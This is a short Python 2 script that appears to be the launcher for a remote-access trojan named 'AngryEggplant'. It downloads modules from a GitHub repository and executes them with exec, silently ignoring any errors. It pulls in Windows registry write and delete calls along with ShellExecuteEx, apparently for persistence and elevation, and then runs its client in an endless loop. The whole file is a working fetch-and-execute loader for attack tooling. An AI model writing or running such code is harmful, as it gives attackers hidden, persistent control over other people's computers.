#!/usr/bin/env python
# -*- encoding: utf-8 -*-
import os
import sys
import socket
import subprocess
from time import sleep
from uuid import uuid1
from imp import new_module
from requests import get, post
from base64 import b64encode, b64decode
from eggplant import Eggplant

try:
    from Crypto.Cipher import AES
    from Crypto.Hash import HMAC, SHA256
except: pass

try:
    if os.name is 'nt':
        from _winreg import HKEY_CURRENT_USER, KEY_WRITE, KEY_ALL_ACCESS, REG_SZ, CloseKey, DeleteValue, OpenKey, SetValueEx
        from ctypes import windll
        from win32com.shell.shell import ShellExecuteEx
except: pass

def main():
    module_info    = [item for item in get('https://api.github.com/repos/colental/AngryEggplant/contents/modules').json() if item['name'] not in globals() if '__' not in item]
    dependencies   = {}
    dependencies['AES']                = 'Crypto.Cipher'
    dependencies['HMAC']               = 'Crypto.Hash'
    dependencies['SHA256']             = 'Crypto.Hash'
    dependencies['bytes_to_long']      = 'Crypto.Util.number'
    dependencies['long_to_bytes']      = 'Crypto.Util.number'                        
    dependencies['ShellExecuteEx']     = 'win32com.shell.shell' if os.name is 'nt' else None
    dependencies['HKEY_CURRENT_USER']  = '_winreg' if os.name is 'nt' else None
    dependencies['KEY_WRITE']          = '_winreg' if os.name is 'nt' else None
    dependencies['KEY_ALL_ACCESS']     = '_winreg' if os.name is 'nt' else None
    dependencies['REG_SZ']             = '_winreg' if os.name is 'nt' else None
    dependencies['CloseKey']           = '_winreg' if os.name is 'nt' else None
    dependencies['DeleteValue']        = '_winreg' if os.name is 'nt' else None
    dependencies['OpenKey']            = '_winreg' if os.name is 'nt' else None
    dependencies['SetValueEx']         = '_winreg' if os.name is 'nt' else None

    for item in module_info:
        name, _ = os.path.splitext(item['name'])
        if '__' not in name:
            try:
                code = get(item['download_url']).text.encode()       
                mod  = new_module(name)
                exec code in mod.__dict__
                globals()[name] = mod
            except Exception as e:
                pass
          

    _eggplant = Eggplant(debug=True)
    _eggplant.run()



if __name__ == '__main__':
    while True:
        main()
